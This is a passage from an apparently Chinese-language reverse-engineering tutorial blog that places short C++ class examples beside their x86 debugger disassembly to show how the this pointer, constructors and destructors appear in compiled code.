class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1560 &gt;  55              push    ebp</span><br><span class=\"line\">010D1561    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1563    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1569    53              push    ebx</span><br><span class=\"line\">010D156A    56              push    esi</span><br><span class=\"line\">010D156B    57              push    edi</span><br><span class=\"line\">010D156C    51              push    ecx</span><br><span class=\"line\">010D156D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1573    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1578    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D157D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D157F    59              pop     ecx</span><br><span class=\"line\">010D1580    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D1583    8BF4            mov     esi,esp</span><br><span class=\"line\">010D1585    68 5C570D01     push    010D575C                                  ; ASCII &quot;~maneger()!\\n&quot;</span><br><span class=\"line\">010D158A    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]         ; msvcr90d.printf</span><br><span class=\"line\">010D1590    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D1593    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1595    E8 BFFBFFFF     call    010D1159</span><br><span class=\"line\">010D159A    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D159D    E8 8BFAFFFF     call    010D102D</span><br><span class=\"line\">//010D102D   /E9 9E050000     jmp     employee::~employee</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D15A2    5F              pop     edi</span><br><span class=\"line\">010D15A3    5E              pop     esi</span><br><span class=\"line\">010D15A4    5B              pop     ebx</span><br><span class=\"line\">010D15A5    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D15AB    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D15AD    E8 A7FBFFFF     call    010D1159</span><br><span class=\"line\">010D15B2    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D15B4    5D              pop     ebp</span><br><span class=\"line\">010D15B5    C3              retn</span><br></pre></td></tr></table></figure>\n<p>private</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"从反汇编角度看this指针\"><a class=\"markdownIt-Anchor\" href=\"#从反汇编角度看this指针\">#</a> 从反汇编角度看 this 指针</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">struct MyStruct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int x ;</span><br><span class=\"line\">    int y ;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">//函数在结构体外部</span><br><span class=\"line\">void Max(MyStruct* str)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (str-&gt;x &gt; str-&gt;y)</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;x);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MyStruct haha ;</span><br><span class=\"line\">    haha.x = 1 ;</span><br><span class=\"line\">    haha.y = 2 ;</span><br><span class=\"line\">    Max(&amp;haha);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,sizeof(haha));</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A1450 &gt;  55              push    ebp</span><br><span class=\"line\">012A1451    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A1453    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">012A1459    53              push    ebx</span><br><span class=\"line\">012A145A    56              push    esi</span><br><span class=\"line\">012A145B    57              push    edi</span><br><span class=\"line\">012A145C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">012A1462    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">012A1467    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A146C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A146E    C745 F4 0100000&gt;mov     dword ptr ss:[ebp-0xC],0x1</span><br><span class=\"line\">012A1475    C745 F8 0200000&gt;mov     dword ptr ss:[ebp-0x8],0x2</span><br><span class=\"line\">012A147C    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">012A147F    50              push    eax</span><br><span class=\"line\">012A1480    E8 CAFCFFFF     call    012A114F</span><br><span class=\"line\">//012A114F   /E9 5C020000     jmp     Max</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">012A1485    83C4 04         add     esp,0x4</span><br><span class=\"line\">012A1488    8BF4            mov     esi,esp</span><br><span class=\"line\">012A148A    6A 08           push    0x8</span><br><span class=\"line\">012A148C    68 40572A01     push    012A5740                         ; ASCII &quot;%d\\n&quot;</span><br><span class=\"line\">012A1491    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;&gt;; msvcr90d.printf</span><br><span class=\"line\">012A1497    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A149A    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A149C    E8 A4FCFFFF     call    012A1145</span><br><span class=\"line\">012A14A1    33C0            xor     eax,eax</span><br><span class=\"line\">012A14A3    52              push    edx</span><br><span class=\"line\">012A14A4    8BCD            mov     ecx,ebp</span><br><span class=\"line\">012A14A6    50              push    eax</span><br><span class=\"line\">012A14A7    8D15 C8142A01   lea     edx,dword ptr ds:[0x12A14C8]</span><br><span class=\"line\">012A14AD    E8 DAFBFFFF     call    012A108C</span><br><span class=\"line\">012A14B2    58              pop     eax</span><br><span class=\"line\">012A14B3    5A              pop     edx</span><br><span class=\"line\">012A14B4    5F              pop     edi</span><br><span class=\"line\">012A14B5    5E              pop     esi</span><br><span class=\"line\">012A14B6    5B              pop     ebx</span><br><span class=\"line\">012A14B7    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">012A14BD    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A14BF    E8 81FCFFFF     call    012A1145</span><br><span class=\"line\">012A14C4    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A14C6    5D              pop     ebp</span><br><span class=\"line\">012A14C7    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>当 haha.x-&gt; 1 和 haha.x -&gt; 2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101344910.png\" alt=\"image-20221110101344910\"></p>\n<p>Max:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A13B0 &gt;  55              push    ebp</span><br><span class=\"line\">012A13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">012A13B9    53              push    ebx</span><br><span class=\"line\">012A13BA    56              push    esi</span><br><span class=\"line\">012A13BB    57              push    edi</span><br><span class=\"line\">012A13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">012A13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">012A13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A13CE    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D1    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D4    8B10            mov     edx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13D6    3B51 04         cmp     edx,dword ptr ds:[ecx+0x4]</span><br><span class=\"line\">012A13D9    7E 1F           jle     short 012A13FA</span><br><span class=\"line\">012A13DB    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13DD    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13E0    8B08            mov     ecx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13E2    51              push    ecx</span><br><span class=\"line\">012A13E3    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A13E8    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A13EE    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A13F1    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A13F3    E8 4DFDFFFF     call    012A1145</span><br><span class=\"line\">012A13F8    EB 1E           jmp     short 012A1418</span><br><span class=\"line\">012A13FA    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13FC    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13FF    8B48 04         mov     ecx,dword ptr ds:[eax+0x4]</span><br><span class=\"line\">012A1402    51              push    ecx</span><br><span class=\"line\">012A1403    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A1408    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A140E    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A1411    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A1413    E8 2DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1418    5F              pop     edi</span><br><span class=\"line\">012A1419    5E              pop     esi</span><br><span class=\"line\">012A141A    5B              pop     ebx</span><br><span class=\"line\">012A141B    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">012A1421    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A1423    E8 1DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1428    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A142A    5D              pop     ebp</span><br><span class=\"line\">012A142B    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>this 看 ecx</p>\n<p>ecx 在内存中为：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101730211.png\" alt=\"image-20221110101730211\"></p>\n<h3 id=\"反汇编中构造函数和析构函数的识别\"><a class=\"markdownIt-Anchor\" href=\"#反汇编中构造函数和析构函数的识别\">#</a> 反汇编中构造函数和析构函数的识别</h3>\n<p>代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class MyTest</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    MyTest();</span><br><span class=\"line\">    ~MyTest();</span><br><span class=\"line\">    void SetTest(DWORD dwTest);</span><br><span class=\"line\">    DWORD GetTest();</span><br><span class=\"line\">public:</span><br><span class=\"line\">    DWORD m_dwTest;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> MyTest::MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     printf(&quot;1111\\n&quot;);</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> MyTest::~MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">    printf(&quot;2222\\n&quot;);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void MyTest::SetTest(DWORD dwTest)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    this-&gt;m_dwTest = dwTest;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD MyTest::GetTest()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return this-&gt;m_dwTest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyTest Test;</span><br><span class=\"line\">\tTest.SetTest(1);</span><br><span class=\"line\">\tint Number = Test.GetTest();</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对应的汇编代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11550 &gt;  55              push    ebp</span><br><span class=\"line\">00D11551    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11553    6A FF           push    -0x1</span><br><span class=\"line\">00D11555    68 E846D100     push    00D146E8</span><br><span class=\"line\">00D1155A    64:A1 00000000  mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00D11560    50              push    eax</span><br><span class=\"line\">00D11561    81EC E4000000   sub     esp,0xE4</span><br><span class=\"line\">00D11567    53              push    ebx</span><br><span class=\"line\">00D11568    56              push    esi</span><br><span class=\"line\">00D11569    57              push    edi</span><br><span class=\"line\">00D1156A    8DBD 10FFFFFF   lea     edi,dword ptr ss:[ebp-0xF0]</span><br><span class=\"line\">00D11570    B9 39000000     mov     ecx,0x39</span><br><span class=\"line\">00D11575    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1157A    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1157C    A1 0080D100     mov     eax,dword ptr ds:[__security_coo&gt;</span><br><span class=\"line\">00D11581    33C5            xor     eax,ebp</span><br><span class=\"line\">00D11583    50              push    eax</span><br><span class=\"line\">00D11584    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D11587    64:A3 00000000  mov     dword ptr fs:[0],eax</span><br><span class=\"line\">00D1158D    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11595    C745 FC 0000000&gt;mov     dword ptr ss:[ebp-0x4],0x0</span><br><span class=\"line\">00D1159C    6A 01           push    0x1</span><br><span class=\"line\">00D1159E    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115A6    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115AE    8945 E0         mov     dword ptr ss:[ebp-0x20],eax</span><br><span class=\"line\">00D115B1    8BF4            mov     esi,esp</span><br><span class=\"line\">00D115B3    FF15 C492D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;; msvcr90d.getchar</span><br><span class=\"line\">00D115B9    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D115BB    E8 8AFBFFFF     call    00D1114A</span><br><span class=\"line\">00D115C0    C785 14FFFFFF 0&gt;mov     dword ptr ss:[ebp-0xEC],0x0</span><br><span class=\"line\">00D115CA    C745 FC FFFFFFF&gt;mov     dword ptr ss:[ebp-0x4],-0x1</span><br><span class=\"line\">00D115D1    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115D4    E8 4FFAFFFF     call    00D11028</span><br><span class=\"line\">00D115D9    8B85 14FFFFFF   mov     eax,dword ptr ss:[ebp-0xEC]</span><br><span class=\"line\">00D115DF    52              push    edx</span><br><span class=\"line\">00D115E0    8BCD            mov     ecx,ebp</span><br><span class=\"line\">00D115E2    50              push    eax</span><br><span class=\"line\">00D115E3    8D15 1016D100   lea     edx,dword ptr ds:[0xD11610]</span><br><span class=\"line\">00D115E9    E8 A3FAFFFF     call    00D11091</span><br><span class=\"line\">00D115EE    58              pop     eax</span><br><span class=\"line\">00D115EF    5A              pop     edx</span><br><span class=\"line\">00D115F0    8B4D F4         mov     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D115F3    64:890D 0000000&gt;mov     dword ptr fs:[0],ecx</span><br><span class=\"line\">00D115FA    59              pop     ecx</span><br><span class=\"line\">00D115FB    5F              pop     edi</span><br><span class=\"line\">00D115FC    5E              pop     esi</span><br><span class=\"line\">00D115FD    5B              pop     ebx</span><br><span class=\"line\">00D115FE    81C4 F0000000   add     esp,0xF0</span><br><span class=\"line\">00D11604    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11606    E8 3FFBFFFF     call    00D1114A</span><br><span class=\"line\">00D1160B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1160D    5D              pop     ebp</span><br><span class=\"line\">00D1160E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D113E0 &gt;  55              push    ebp</span><br><span class=\"line\">00D113E1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D113E3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D113E9    53              push    ebx</span><br><span class=\"line\">00D113EA    56              push    esi</span><br><span class=\"line\">00D113EB    57              push    edi</span><br><span class=\"line\">00D113EC    51              push    ecx</span><br><span class=\"line\">00D113ED    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D113F3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D113F8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D113FD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D113FF    59              pop     ecx</span><br><span class=\"line\">00D11400    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11403    8BF4            mov     esi,esp</span><br><span class=\"line\">00D11405    68 3C67D100     push    00D1673C                                 ; ASCII &quot;1111\\n&quot;</span><br><span class=\"line\">00D1140A    FF15 CC92D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]        ; msvcr90d.printf</span><br><span class=\"line\">00D11410    83C4 04         add     esp,0x4</span><br><span class=\"line\">00D11413    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D11415    E8 30FDFFFF     call    00D1114A</span><br><span class=\"line\">00D1141A    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D1141D    5F              pop     edi</span><br><span class=\"line\">00D1141E    5E              pop     esi</span><br><span class=\"line\">00D1141F    5B              pop     ebx</span><br><span class=\"line\">00D11420    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">00D11426    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11428    E8 1DFDFFFF     call    00D1114A</span><br><span class=\"line\">00D1142D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1142F    5D              pop     ebp</span><br><span class=\"line\">00D11430    C3              retn</span><br><span 